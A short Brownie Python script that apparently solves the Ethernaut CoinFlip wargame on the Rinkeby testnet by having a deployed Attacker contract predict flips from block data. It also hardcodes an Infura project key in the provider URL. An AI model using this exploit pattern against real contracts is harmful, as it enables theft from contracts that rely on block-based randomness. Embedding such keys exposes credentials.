from brownie import Contract, CoinFlip, Attacker, accounts, config
from web3 import Web3
from time import sleep

INSTANCE_ADDRESS = "0xd9136e20C7bEE5ECb9BDC93E27DBA52127297b80"
INFURA_URL = "https://rinkeby.infura.io/v3/5da4ebb30a1146fd81244caacd61362b"
ACCOUNT = "straul"

w3 = Web3(Web3.HTTPProvider(INFURA_URL))
def get_account():
    account = accounts.load(ACCOUNT)
    return account


def attack(account):
    coinflip = Contract.from_abi(name='CoinFlip', address=INSTANCE_ADDRESS, abi=CoinFlip.abi)

    # attacker = Attacker.deploy({'from': account})
    attacker = Attacker[-1]

    # needs to be called 10 times, block number should be different for each tx
    attacker.attack(coinflip.address, {'from': account})

def main():
    account = get_account()
    attack(account)